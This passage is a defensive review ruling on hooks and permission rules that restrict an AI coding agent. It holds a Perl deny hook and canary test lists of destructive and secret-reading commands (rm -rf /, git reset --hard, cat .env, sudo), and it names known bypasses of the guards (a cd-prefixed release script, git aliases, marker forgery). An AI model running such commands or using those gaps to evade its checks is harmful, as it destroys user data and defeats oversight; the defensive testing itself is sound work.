  for my $lit (@never) {    # never-touch: the tokens in order anywhere in one command, under the lock or not
    next if $data && !tok_eq($lit->[0], $r[0]);
    my $k = 0;
    for my $w (@r) { $k++ if $k < @$lit && tok_eq($lit->[$k], $w) }
    next unless $k == @$lit;
    print STDERR 'BLOCKED: `', join(' ', @$lit), "` is a never-touch deploy command (stack.deploy.never_touch): only the owner runs it.\n";
    exit 2;
  }
  next if $data || $e->{wrapper} || $e->{locked};
```
(the `for my $lit (@literals)` block below it is unchanged). Update the file header and `hooks/check-test-command.sh:3-4` to name both lists.
Runner: new token `@repo-never` = `mkcfg never '{"stack":{"locked_commands":["test:e2e"],"deploy":{"never_touch":["gh workflow run deploy-prod","tools/release.sh prod","git push heroku"]}}}'`, added to `resolve_cwd` and the header comment (`run-canaries.sh:12-15, 37, 52-56`).
Canary rows: matrix M2 (section 7), hook `check-test-command.sh`, cwd `@repo-never`, deny reason `never-touch deploy command` (the last deny line keeps reason `stack.locked_commands`). Prototype run: 23 of 24 as listed; the 24th (`cd tools && ./release.sh prod`) is recorded as an allow row with class `known-gap`.
Tests: process tests for a wrapped never-touch command (denied under `stack-lock.sh --`), a flag before the target, a `./` prefix, data forms allowed, `never_touch: "x"` and `deploy: []` fail closed, list absent with `locked_commands` set behaves as before. Mutants: the never loop moved below the `locked` skip; subsequence turned into adjacency; `tok_eq` path-suffix branch removed; the `$data` exception removed (kills `git push heroku`).

### C7 (MED) Merge into `master` is asked, not granted
`hooks/lib/check-git-merge-target.pl:58`: `... if $branch eq '{{stack.branch.default}}' || $branch eq 'master';`. Header `:3-4` and `hooks/check-git-merge-target.sh:3-4`: "the default branch (or `master`)".
Runner: token `@repo-master` = `mkrepo master master`. Rows (hook `check-git-merge-target.sh`): `git merge feature/x` in `@repo-master` → ask, reason `{{project.owner_title}} approval required`; `git merge feature/x && git status` in `@repo-master` → ask. The existing grant row on `@repo-feature` stays.
Process test in the 3.5 describe: default `main`, checkout on `master` → ask; mutant (the `master` clause removed) → the test fails with `grant`.

### C8 (MED) Bound the flake hook's run time, fail closed
`hooks/check-flake-patterns.sh`, replace lines 8-10:
```bash
PERL=/usr/bin/perl; [ -x "$PERL" ] || PERL="$(command -v perl 2>/dev/null)"
[ -x "$PERL" ] || { echo "BLOCKED: perl not found, check-flake-patterns cannot bound its run time (fail closed)" >&2; exit 2; }
"$PERL" -e 'alarm shift; exec @ARGV or exit 127' 10 "$NODE" "${BASH_SOURCE[0]%/*}/lib/flake-gate.mjs" --hook
rc=$?
case "$rc" in
  0|2) exit "$rc";;
  142) echo "BLOCKED: check-flake-patterns ran past 10 s (a stack.flake_patterns regex that backtracks?), failing closed" >&2; exit 2;;
  *) echo "BLOCKED: hook check-flake-patterns crashed (rc=$rc), failing closed" >&2; exit 2;;
esac
```
Header line 5 gains "a scan past 10 s". Prototype: the backtracking pattern exits 2 after 10.1 s with that message; a normal edit takes 43 ms; 339 rows pass.
Process test: config pattern `^(a+)+$`, Write of a test-glob file holding 40 `a` and `!` → exit 2, stderr names `10 s`, elapsed under 15 s. The missing-node test stays (node is checked first). Mutant: the alarm removed → the test times out and fails.

### C9 (MED) Trailer check covers the tooling and row removal
`scripts/validation/hook-patch-trailer-check.sh`:
- `:21` `PATHS=(.claude/hooks .claude/settings.json scripts/hooks-apply.sh scripts/validation/hook-patch-trailer-check.sh scripts/validation/hook-canaries/run-canaries.sh)`.
- After the loop at `:39-44`: for each commit of `FLOOR_SHA..HEAD_SHA` touching `scripts/validation/hook-canaries/canaries.jsonl`, sum the deleted column of `git show --numstat --format= <sha> -- <corpus>`; when it is above 0 and the commit has no `Hook-Patch` trailer, add `"<sha9> <subject> (removes or rewrites N canary row(s))"` to `missing`. Adding rows needs no trailer.
- Header `:2-9`: one sentence: a `project sync` run from a terminal that changes these paths is committed by that person with `Hook-Patch: preset-<name>-<version>`; `hooks-apply.sh` stamps its own.
`scripts/hooks-apply.sh`: after `:57` add `git diff --quiet HEAD -- scripts/validation/hook-canaries scripts/hooks-apply.sh || die "uncommitted changes to the canary runner, the corpus or this script; commit or revert them first"` (real mode only; `--dry-run` is unchanged).
Tests (3.10 describe): a commit that edits the runner without a trailer fails naming it; with the trailer passes; a commit that deletes one corpus row fails; a commit that only appends a row passes; the deploy commit alone still passes. Mutants: the runner path dropped from `PATHS`; the deleted-rows check compares `> 1`.

### C10 (LOW) Remove the dead `fail-closed.sh`
Delete `presets/base/hooks/lib/fail-closed.sh` and its entry (`preset.json:28-34`). Update the 3.1 and 3.7 literal file lists and the guarded count. No hook sources it; the fail-closed verdict the 3.3 test asserts comes from `ShellParse.pm:355`.

### C11 (LOW) Comments that overstate
- `hooks/block-push-without-local-tests.sh:2-3`: "... and block the plain ways of writing the marker (a steer for honest agents, not a boundary: see lib/block-push-without-local-tests.pl)".
- `canaries/run-canaries.sh:3`: "Lives outside .claude/hooks so rows can be added without touching enforcement; a changed runner or a removed row is reported by hook-patch-trailer-check.sh."

### C12 (LOW) Branch name and length checks
`bin/project-profile.js`: `stack.branch.default` (`:153`) uses a branch check: `RENDERED_TEXT_RE`, no space, no leading `-` or `/`, no `..`, no trailing `/` or `.lock`. `renderedTextCheck` (`:52-54`) and `isRenderedText` (`bin/project-profile-keys.js:12`) also require length ≤ 80.
Tests (`project-profile.test.js`): `"release/1.x"` accepted; `"my branch"`, `"-x"`, `"a..b"`, `"x.lock"` and an 81-character `owner_title` rejected.

### Shared test updates (after C3-C10)
- 3.2: allow 77, fixed deny 33, ask 7; 3.12: deny set 38.
- 3.7: `PreToolUse` has two groups, `Bash` with five hooks in order (the four existing, then `check-denied-command.sh`) and `Write|Edit` with one; deployed file lists lose `fail-closed.sh` and gain the two new files; guarded entries: 14 hook files + 3 scripts = 17.
- 3.7 exception file: recompute every `.claude/settings.json` and manifest line number; no new class may appear (the new hook and rows use only `docker`, already excepted).
- 3.4/3.5/3.9/3.11 row-count assertions: add the new rows per hook (C2: 3 + 1, C5: matrix + 2, C6: 24, C7: 2).
- Summary: one line per ruling point with its commit hash, and each mutant killed.

---

## 3. Accepted as is

- **A1** Write-capable options on allowed read commands (`git diff|log|show --output=`, `tree -o`, redirects). A write lands where Edit could write; the redirect target has its own check (docs).
- **A2** Environment secrets printed by `echo`, `printf`, `jq -n env`. Not a file rule; out of reach of a row or a tokeniser.
- **A3** Local moves of the default branch other than `git merge` (`pull <remote> <other>`, `cherry-pick`, `rebase`, `branch -f`, `update-ref`, `fetch . x:main`). The irreversible step, the push, is asked.
- **A4** `stack.locked_commands`, `stack.flake_patterns` and `stack.deploy.never_touch` live in an agent-writable file. They are opt-in project lists; guarding `.planning/config.json` would block ordinary workflow settings.
- **A5** `git push --force-with-lease` is not denied or asked (as in the source).
- **A6** Matcher `Write|Edit` does not cover `NotebookEdit`.
- **A7** Fail-closed on a missing perl or node, with the tool named. Fail-open on a missing gate script.
- **A8** `rtk grep` deny kept in the search hook (3.3 summary), `deno` and `pnpm` in generic interpreter and wrapper lists with their exception entries (3.7), the inert literal renamed to `gsd-unused-deploy-entry-N`, `git grep -n` as the rendered search default. All confirmed.
- **A9** `bash scripts/stack-lock.sh --label x -- bash -c "<listed>"` denied (3.9 finding): fail-safe direction, `ShellParse.pm` stays frozen.
- **A10** `Bash(sudo npm:*)` redundant with `Bash(sudo:*)`; `Bash(> /dev/sda:*)` nearly dead. Both harmless.
- **A11** Marker forgery by indirect writers (Q9) and push by other commands (`git -c alias.p=push p`, `git send-pack`, probe: allowed). Steer.
- **A12** The deployed hooks rely on the fork's user-global protect hook and on Claude Code's protected paths for write protection; the base preset adds detection (C9), not a second write block.
- **A13** (review round 2) The settings row `Read(~/.a?s/**)` keeps its glob spelling. The lint class `cloud` is a vendor-name class, not a generic-tool list (the exception file allows only `deno`, `pnpm`, `docker`, and a new class is forbidden), so the explicit spelling of that directory cannot be excepted. The glob also matches other three-letter dot directories of that shape; the hook regex `a[w]s` is exact. No `Read(~/.ssh/id_ed25519*)` or `id_ecdsa*` row is added: `Read(~/.ssh/**)` already covers both, and a new row would change the pinned deny set for no new coverage.

## 4. Policy points for the owner (no change ruled)

- **P1** `Read(**/secrets/**)` blocks source code in any directory named `secrets`, and a project cannot remove the row (`sync` re-adds it). If a project hits this, the only fix is a base preset change. Alternative for a later version: `Read(/secrets/**)` (project root only).
- **P2** The three ask rows stall an unattended run (a prompt nobody answers). `npm uninstall` in particular is ordinary dependency cleanup. Keep as planned for now; revisit with the first unattended base project.

## 5. Unverified, with the probe that settles each

| # | Claim | Probe |
|---|---|---|
| U1 | The control-structure allow rows are dead (matcher extracts body commands for allow as it does for deny) | tmp project with the C3 fragment, default mode: `for f in a b; do echo $f; done` and `if [ -f x ]; then cat x; fi` run without a prompt; `if true; then touch y; fi` prompts |
| U2 | Read deny rows `**/.env…` block the Read tool at any depth and `cat`, and leave `.env.example` readable | same project: Read `apps/api/.env.local` denied, Read `.env.example` allowed, `cat .env` denied |
| U3 | Bare tool rows `Grep`, `Glob`, `LSP` are valid and raise no settings warning | start a session in that project; `/permissions` lists them, no startup warning |
| U4 | A timed-out or missing (rc 127) PreToolUse hook lets the call through; default timeout 600 s | register a hook that sleeps past a 5 s `timeout`, and one whose file does not exist; run `ls` |
| U5 | Writes under `.git` and `.claude` prompt in default mode and are allowed in bypassPermissions | Write `.git/.pre-pr-passed` in default mode and in bypass mode |
| U6 | The live matcher results of Q7 hold for the Claude Code version a base project will run | repeat the Q7 command list in the tmp project after C4 |
| U7 | `age_file` (`run-canaries.sh:22`, perl `utime`) on Linux | first CI run (already named in the 3.4 summary) |
| U8 | Middle wildcards in the space form (`Bash(git push * --force)`) | not needed after C5; would be the row-only alternative |

## 6. Reference implementation: `hooks/lib/check-denied-command.pl`

```perl
# check-denied-command: the tokenised twin of the settings deny and ask rows. A permission row stops one literal
# spelling; this hook stops the same command behind `git -C`, `git -c`, a trailing flag, a split or reordered flag
# cluster, `env`, `bash -c` or a path prefix. It adds no policy of its own, and it is a steer, not a boundary:
# a variable assembled at run time or a script that runs the command is not chased.
# deny: sudo/doas as a command word; recursive rm of the root, the home directory, the working directory or a bare glob;
#       git push with --force/-f or a +refspec; git reset --hard; a forced git clean that is not a dry run;
#       a reader command (cat, grep, jq ...) given a .env file or a path under a secrets/ directory.
# ask:  git rebase, git pull --rebase.
use strict; use warnings;
use ShellParse qw(parse_shell flatten git_calls read_input base);
use JSON::PP;

my $in = read_input();
my $command = ($in->{tool_input} // {})->{command} // '';    # a non-object tool_input dies here: run-perl.sh fails closed
my $cwd = $in->{cwd};
$cwd = '.' unless defined $cwd && !ref $cwd && length $cwd;
my ($cmds) = parse_shell($command);
my @entries = flatten($cmds, $cwd);

sub deny { print STDERR "BLOCKED: $_[0]\n"; exit 2 }
sub ask { print encode_json({ hookSpecificOutput => { hookEventName => 'PreToolUse', permissionDecision => 'ask', permissionDecisionReason => $_[0] } }), "\n"; exit 0 }

my $ROOT_LIKE = qr{^(?:/|~|\$HOME|\$\{HOME\}|\.|\.\.)?/?\*?$};    # / ~ $HOME . .. each bare, with a trailing / or /*; and * alone
my %READER = map { $_ => 1 } qw(cat head tail less more grep egrep fgrep rg sed awk cut tr wc sort uniq nl tac strings xxd od
  hexdump base64 jq yq diff cmp);
sub secret_path {
  my ($w) = @_;
  return 0 if $w =~ /^-/;
  my @seg = grep { length } split m{/}, $w;
  return 0 unless @seg;
  my $b = pop @seg;
  return 1 if grep { $_ eq 'secrets' } @seg;
  return 1 if $b eq '.env';
  return ($b =~ /^\.env\./ && $b !~ /^\.env\.(?:example|sample|template)$/) ? 1 : 0;
}

for my $e (@entries) {
  my @r = @{ $e->{rest} }; next unless @r;
  my @w = @{ $e->{words} };
  my @prefix = @w[0 .. $#w - @r];
  deny('sudo is never run by an agent: ask the owner to run the command') if grep { base($_) eq 'sudo' } @prefix;    # R1
  my $h = base($r[0]);
  deny('doas is never run by an agent: ask the owner to run the command') if $h eq 'doas';
  if ($h eq 'rm') {                                                                                                   # R2
    my ($recursive, $opts, @targets) = (0, 1);
    for my $a (@r[1 .. $#r]) {
      if ($opts && $a eq '--') { $opts = 0; next }
      if ($opts && $a =~ /^-/) { $recursive = 1 if $a eq '--recursive' || $a =~ /^-[A-Za-z]*[rR]/; next }
      push @targets, $a;
    }
    my @bad = grep { $_ =~ $ROOT_LIKE } @targets;
    deny("recursive rm of '$bad[0]' removes a whole tree: name the directory to remove") if $recursive && @bad;
  }
  if ($READER{$h}) {                                                                                                  # R6
    my @hit = grep { secret_path($_) } @r[1 .. $#r], map { /^<([^<].*)$/ ? $1 : () } @{ $e->{redirs} };
    deny("'$hit[0]' may hold secrets and is not read by an agent: read the committed template (.env.example) or ask the owner") if @hit;
  }
}

for my $g (git_calls(@entries)) {                                                                                     # R3
  my @a = @{ $g->{args} };
  if ($g->{sub} eq 'push') {
    deny('git push --force overwrites the remote branch: never run by an agent')
      if grep { $_ eq '--force' || /^-[A-Za-z]*f[A-Za-z]*$/ || /^\+./ } @a;
  }
  deny('git reset --hard discards uncommitted work: never run by an agent') if $g->{sub} eq 'reset' && grep { $_ eq '--hard' } @a;
  if ($g->{sub} eq 'clean') {
    my $force = grep { $_ eq '--force' || /^-[A-Za-z]*f/ } @a;
    my $dry = grep { $_ eq '--dry-run' || /^-[A-Za-z]*n/ } @a;
    deny('git clean -f deletes untracked files: never run by an agent (use -n to list them)') if $force && !$dry;
  }
}
for my $g (git_calls(@entries)) {                                                                                     # R4
  my @a = @{ $g->{args} };
  ask('git rebase rewrites history - {{project.owner_title}} approval required') if $g->{sub} eq 'rebase';
  ask('git pull --rebase rewrites history - {{project.owner_title}} approval required')
    if $g->{sub} eq 'pull' && grep { /^--rebase(?:=.*)?$/ || /^-[A-Za-z]*r[A-Za-z]*$/ } @a;
}
exit 0;
```
The deny loops run before the ask loop so a compound command with both is denied. The trailing `# R<n>` markers are for this ruling only; drop them in the file.

## 7. Canary matrices (prototype-verified)

### M1: `check-denied-command.sh`, cwd `@repo-feature`
Reasons: sudo rows `sudo is never run`; doas `doas is never run`; rm rows `recursive rm`; secret rows `may hold secrets`; push rows `git push --force`; reset rows `git reset --hard`; clean rows `git clean -f`; ask rows `{{project.owner_title}} approval required`.

deny:
```
git push --force
git push -f origin x
git push origin x --force
git push -uf origin x
git push origin +x
git -C wt push origin x:y --force
bash -c "git push --force"
git reset --hard
git -C /tmp/x reset --hard HEAD~1
git -c a.b=c reset --hard
cd x && git reset --hard origin/main
env GIT_TRACE=0 git reset --hard
git clean -fd
git clean -fdx
git clean -f -d
git clean -d --force
git clean -xdf
rm -rf /
rm -rf ~
rm -rf *
rm -fr *
rm -r -f ./*
rm -rf -- *
rm -rf "$HOME"
rm -rf ~/
rm -rf /*
rm -rf .
rm -rf ..
rm --recursive --force ../*
sudo rm -rf dist
sudo ls
env sudo ls
command sudo -n true
/usr/bin/sudo ls
xargs sudo rm
bash -c "sudo ls"
doas ls
cat .env
cat ./apps/api/.env.local
grep -n KEY .env
head -3 config/secrets/prod.json
jq . secrets/token.json
tr a b < .env
cut -d= -f1 .env.production
```
allow:
```
git push --force-with-lease origin x
git push origin x
git push -u origin feature
git commit -m "never git push --force"
echo git push --force
git reset --soft HEAD~1
git reset HEAD file.txt
git clean -n -f -d
git clean -fdxn
git clean --dry-run -fd
git clean -n
rm -rf dist
rm -rf .tmp/x
rm -rf /tmp/scratch/x
rm -f *.log
rm -rf ./build/*
rm *
echo sudo
grep -n sudo README.md
X=sudo ls
cat .env.example
grep -c . apps/web/.env.sample
cp .env.example .env
ls -la .env
test -f .env
cat src/secretsmanager/client.ts
grep -n secrets README.md
cat docs/env.md
git pull origin main
git log --oneline
```
ask:
```
git rebase main
git -C wt rebase -i HEAD~3
git pull --rebase
git pull -r origin main
```

### M2: `check-test-command.sh`, cwd `@repo-never`
deny (reason `never-touch deploy command`):
```
gh workflow run deploy-prod
gh workflow run --ref main deploy-prod
gh -R o/r workflow run deploy-prod -f x=1
/opt/homebrew/bin/gh workflow run deploy-prod
tools/release.sh prod
./tools/release.sh prod
bash tools/release.sh prod
bash -c "./tools/release.sh --yes prod"
ENV=x /abs/proj/tools/release.sh prod
scripts/stack-lock.sh --label x -- tools/release.sh prod
git push heroku main
git -C . push heroku main
```
deny (reason `stack.locked_commands`): `npm run test:e2e`
allow:
```
gh workflow run deploy-staging
gh workflow view deploy-prod
gh workflow list
tools/release.sh staging
echo gh workflow run deploy-prod
git commit -m "gh workflow run deploy-prod"
grep -n "release.sh prod" README.md
git push origin main
scripts/stack-lock.sh --label x -- npm run test:e2e
ls
```
allow, class `known-gap`: `cd tools && ./release.sh prod`

## 8. Carry-over (not in this review's scope)

- **K1** (8.7, batched Fable diff review): the gate script must write `"$(git rev-parse --absolute-git-dir)/.pre-pr-passed"`; its preset entry must be `guarded: true` and its path must be watched by the trailer check (probe: appending a marker write to the gate script is allowed by every hook). Consider writing the HEAD sha into the marker and comparing it in `block-push-without-local-tests.pl:53`, so a commit made after the gate ran needs a new run.
- **K2** (4.x interview, 2.1 wiring): detect the repository's real default branch instead of filling `main` (`bin/project-registry.js:107`); C7 only softens the miss.
- **K3** (4.x, M-04): never render an allow row from `.planning/config.json`; the project's own test, typecheck and lint commands need an owner-confirmed allow list or unattended runs in default mode stall on them.
- **K4** (7.2 pilot): run probes U1-U6 once in the pilot project and record the results beside this file.
